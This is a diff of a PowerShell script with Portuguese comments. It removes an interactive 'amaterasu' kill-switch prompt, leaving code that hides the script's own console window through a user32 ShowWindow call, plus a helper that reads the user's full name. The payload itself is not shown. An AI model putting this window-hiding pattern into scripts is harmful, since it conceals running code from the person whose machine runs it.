@@ -40,31 +40,12 @@
 #  Steam: Clank.PT                                                                                                                                         #
 ############################################################################################################################################################
 
-# Define uma função para verificar a entrada do usuário
-function Verificar-Input {
-    $input = Read-Host "Insira 'amaterasu' para desativar tudo"
-
-    if ($input -eq "amaterasu") {
-        Write-Host "Desativando todas as atividades..."
-        # Parar todas as atividades aqui
-        # Por exemplo, você pode parar o agendamento, encerrar processos em execução, etc.
-        # Certifique-se de adicionar aqui todas as operações que deseja desativar quando a palavra-chave for inserida
-        Stop-Process -Name "powershell" -Force
-        exit
-    } else {
-        Write-Host "Código de desativação incorreto."
-        # Chama a função novamente para verificar nova entrada
-        Verificar-Input
-    }
-}
-
-# Chama a função para verificar a entrada do usuário continuamente
-Verificar-Input
-
+# Esconde a janela do PowerShell
 $i = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);';
 add-type -name win -member $i -namespace native;
 [native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);
 
+# Função para desativar tudo ao inserir "amaterasu"
 function Desativar-Tudo {
     param (
         [string]$input
@@ -120,6 +101,8 @@ function Get-fullName {
 }
 
 $fullName = Get-fullName
+
+# Continuação do script...
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
